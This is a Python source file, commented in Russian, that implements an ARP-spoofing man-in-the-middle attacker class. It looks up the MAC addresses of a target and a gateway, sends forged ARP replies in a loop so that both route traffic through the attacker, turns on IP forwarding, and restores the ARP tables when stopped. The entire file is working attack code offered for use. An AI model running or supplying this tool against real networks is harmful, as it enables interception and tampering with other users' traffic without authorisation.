#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import platform
import time
import threading
import subprocess
from typing import Optional, Dict
from utils import enable_ip_forwarding, disable_ip_forwarding


class MITMAttacker:
    def __init__(self, target_ip: str, gateway_ip: str, interface: str):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.running = False
        self.attack_thread = None
        self.spoofing = False

        # MAC адреса
        self.target_mac: Optional[str] = None
        self.gateway_mac: Optional[str] = None
        self.attacker_mac: Optional[str] = None

        # Статистика
        self.spoof_packets_sent = 0
        self.start_time = 0

        # Проверяем платформу
        if platform.system() == "Windows":
            print("[!] MITM attacks require Npcap/WinPcap on Windows")
            print("[!] Install Npcap from https://nmap.org/npcap/")
            return

        # Получаем MAC адреса
        self._get_macs()

    def _get_macs(self):
        """Получить MAC адреса целевых устройств"""
        if platform.system() == "Windows":
            # На Windows без Npcap не можем получить MAC адреса
            self.target_mac = "00:00:00:00:00:00"
            self.gateway_mac = "00:00:00:00:00:00"

            # Получаем собственный MAC
            try:
                result = subprocess.check_output(f"getmac /fo csv /v", shell=True, text=True)
                lines = result.split('\n')
                for line in lines:
                    if self.interface in line:
                        parts = line.split(',')
                        if len(parts) > 2:
                            self.attacker_mac = parts[2].strip().replace('"', '')
                            break
            except:
                self.attacker_mac = "00:00:00:00:00:00"
        else:
            # Оригинальный код для Linux
            from scapy.all import ARP, Ether, srp

            self.target_mac = self._get_mac(self.target_ip)
            self.gateway_mac = self._get_mac(self.gateway_ip)

            # Получаем собственный MAC
            try:
                with open(f"/sys/class/net/{self.interface}/address", 'r') as f:
                    self.attacker_mac = f.read().strip()
            except:
                pass

    def _get_mac(self, ip: str) -> Optional[str]:
        """Получить MAC адрес по IP"""
        if platform.system() == "Windows":
            # На Windows без Npcap не можем получить MAC по IP
            return "00:00:00:00:00:00"

        try:
            # Оригинальный код для Linux
            from scapy.all import ARP, Ether, srp

            # Пытаемся получить из ARP кэша
            result = subprocess.check_output(f"arp -a {ip}", shell=True, text=True, stderr=subprocess.DEVNULL)
            lines = result.split('\n')
            for line in lines:
                if ip in line:
                    parts = line.split()
                    for part in parts:
                        if ':' in part or '-' in part:
                            return part.replace('-', ':')

            # Если не нашли в ARP кэше, отправляем ARP запрос
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request

            answered_list = srp(arp_request_broadcast, timeout=1, verbose=False, iface=self.interface)[0]

            if answered_list:
                return answered_list[0][1].hwsrc

        except Exception as e:
            print(f"[!] Ошибка получения MAC для {ip}: {e}")

        return None

    def spoof(self, target_ip: str, spoof_ip: str, target_mac: Optional[str] = None):
        """Отправить поддельный ARP пакет"""
        if platform.system() == "Windows":
            print("[!] ARP spoofing requires Npcap on Windows")
            return False

        try:
            from scapy.all import ARP, send

            if not target_mac:
                target_mac = self._get_mac(target_ip)

            if target_mac:
                # Создаем ARP ответ (op=2) с подмененным IP
                arp_response = ARP(
                    op=2,  # ARP ответ
                    pdst=target_ip,
                    hwdst=target_mac,
                    psrc=spoof_ip,
                    hwsrc=self.attacker_mac
                )

                # Отправляем пакет
                send(arp_response, verbose=False, iface=self.interface)
                self.spoof_packets_sent += 1
                return True

        except Exception as e:
            print(f"[!] Ошибка отправки ARP спуфинга: {e}")

        return False

    def restore(self, target_ip: str, gateway_ip: str):
        """Восстановить ARP таблицы"""
        if platform.system() == "Windows":
            print("[!] ARP restoration requires Npcap on Windows")
            return False

        try:
            from scapy.all import ARP, send

            target_mac = self._get_mac(target_ip)
            gateway_mac = self._get_mac(gateway_ip)

            if target_mac and gateway_mac:
                # Восстанавливаем ARP запись цели
                arp_target = ARP(
                    op=2,
                    pdst=target_ip,
                    hwdst=target_mac,
                    psrc=gateway_ip,
                    hwsrc=gateway_mac
                )

                # Восстанавливаем ARP запись шлюза
                arp_gateway = ARP(
                    op=2,
                    pdst=gateway_ip,
                    hwdst=gateway_mac,
                    psrc=target_ip,
                    hwsrc=target_mac
                )

                # Отправляем по несколько пакетов для надежности
                send(arp_target, count=3, verbose=False, iface=self.interface)
                send(arp_gateway, count=3, verbose=False, iface=self.interface)

                return True

        except Exception as e:
            print(f"[!] Ошибка восстановления ARP: {e}")

        return False

    def start_attack(self):
        """Запустить MITM атаку"""
        if self.running:
            return

        if platform.system() == "Windows":
            print("[!] MITM attacks not available on Windows without Npcap")
            print("[!] Install Npcap from https://nmap.org/npcap/")
            return

        # Проверяем MAC адреса
        if not self.target_mac:
            print(f"[!] Не удалось получить MAC адрес цели: {self.target_ip}")
            return
        if not self.gateway_mac:
            print(f"[!] Не удалось получить MAC адрес шлюза: {self.gateway_ip}")
            return

        # Включаем IP forwarding
        if not enable_ip_forwarding():
            print("[!] Не удалось включить IP forwarding. Атака может не работать.")

        self.running = True
        self.spoofing = True
        self.start_time = time.time()
        self.spoof_packets_sent = 0

        print(f"[*] Запуск MITM атаки: {self.target_ip} -> {self.gateway_ip}")
        print(f"[*] MAC цели: {self.target_mac}")
        print(f"[*] MAC шлюза: {self.gateway_mac}")
        print(f"[*] Ваш MAC: {self.attacker_mac}")

        try:
            while self.running:
                # Спуфим цель, что мы шлюз
                self.spoof(self.target_ip, self.gateway_ip, self.target_mac)

                # Спуфим шлюз, что мы цель
                self.spoof(self.gateway_ip, self.target_ip, self.gateway_mac)

                time.sleep(2)

        except KeyboardInterrupt:
            self.stop_attack()
        except Exception as e:
            print(f"[!] Ошибка в MITM атаке: {e}")
            self.stop_attack()

    def stop_attack(self):
        """Остановить атаку и восстановить сеть"""
        if not self.running:
            return

        print("\n[*] Остановка MITM атаки...")
        print("[*] Восстановление ARP таблиц...")

        self.running = False
        self.spoofing = False

        # Восстанавливаем ARP таблицы (только на Linux)
        if platform.system() != "Windows":
            self.restore(self.target_ip, self.gateway_ip)

        # Выключаем IP forwarding
        disable_ip_forwarding()

        # Выводим статистику
        duration = time.time() - self.start_time
        print(f"[*] Атака длилась: {duration:.1f} секунд")
        print(f"[*] Отправлено ARP пакетов: {self.spoof_packets_sent}")
        print("[*] Сеть восстановлена")

    def get_status(self) -> Dict:
        """Получить статус атаки"""
        return {
            "running": self.running,
            "spoofing": self.spoofing,
            "target_ip": self.target_ip,
            "gateway_ip": self.gateway_ip,
            "target_mac": self.target_mac,
            "gateway_mac": self.gateway_mac,
            "attacker_mac": self.attacker_mac,
            "spoof_packets_sent": self.spoof_packets_sent,
            "duration": time.time() - self.start_time if self.start_time > 0 else 0
        }
